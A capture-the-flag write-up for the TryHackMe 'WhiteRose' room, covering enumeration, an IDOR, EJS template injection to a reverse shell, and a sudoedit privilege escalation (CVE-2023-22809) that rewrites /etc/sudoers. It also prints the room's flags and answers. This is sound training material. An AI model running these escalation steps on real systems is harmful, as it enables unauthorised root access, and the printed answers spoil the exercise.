# TryHackMe – WhiteRose Write-up

## Machine Info
- **Name:** WhiteRose (cyprusbank)  
- **IP:** `xxx.xxx.xxx.xxx`  
- **Difficulty:** Easy  
- **Objective:** Get user.txt and root.txt flags  

---

## Enumeration

### Nmap Scan
```bash
nmap -sC -sV -Pn -p- xxx.xxx.xxx.xxx
```

**Results:**
- `22/tcp` → SSH (OpenSSH 7.6p1 Ubuntu 4ubuntu0.7)  
- `80/tcp` → HTTP (nginx 1.14.0, Ubuntu)  

At `http://10.10.107.216/` we are redirected to `http://cyprusbank.thm/`.  
Add to `/etc/hosts`:

```
xxx.xxx.xxx.xxx   cyprusbank.thm
```

---

### Subdomain Enumeration
```bash
ffuf -u http://cyprusbank.thm/ \
-w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt \
-H "Host: FUZZ.cyprusbank.thm" -fs 57
```

**Discovered:**
- `www.cyprusbank.thm`  
- `admin.cyprusbank.thm`  

Update `/etc/hosts`:

```
xxx.xxx.xxx.xxx   cyprusbank.thm www.cyprusbank.thm admin.cyprusbank.thm
```

---

## Exploitation

### Admin Panel Access
At `http://admin.cyprusbank.thm` we see a login form.  
Given credentials work:

```
Username: Olivia Cortez
Password: olivi8
```

---

### IDOR in Messages
In `Messages` we see parameter `c`:

```
http://admin.cyprusbank.thm/messages/?c=5 → messages
http://admin.cyprusbank.thm/messages/?c=0 → older messages
```

From messages we discover:
- Admin: **Gayle Bev**  
- Password of Gayle → login successful  
- Found **Tyrell Wellick’s phone number: 842-029-5701**

---

### Source Leak and Fuzzing
Intercept request to `/settings` in Burp.  
Removing `password` parameter → ReferenceError with source code leak.  

Parameter fuzzing:
```bash
ffuf -request req2.ffuf -request-proto http \
-w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1561
```

Interesting parameters:
- `client`
- `delimiter`
- `async`

Application uses **EJS templates** → vulnerable to SSTI (CVE-2022-29078).

---

### Remote Code Execution
Exploit SSTI and set up reverse shell:

```bash
nc -lnvp 9001
```

On shell:
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
```

Access gained as **web** user.

---

## Privilege Escalation

### Sudo Permissions
```bash
sudo -l
```

Output:
```
(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Sudo version: `1.9.12p1` → vulnerable to CVE-2023-22809.

---

### Exploit sudoedit
```bash
export SUDO_EDITOR='nano -- /etc/sudoers'
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Add:
```
web ALL=(ALL:ALL) NOPASSWD: ALL
```

---

### Root Access
```bash
sudo su
cd /root
cat root.txt
```

---

## Flags
- **user.txt** → `THM{4lways_upd4te_uR_d3p3nd3nc!3s}`  
- **root.txt** → `THM{4nd_uR_p4ck4g3s}`  
 Answers:
- Tyrell Wellick’s phone number: `842-029-5701`

---
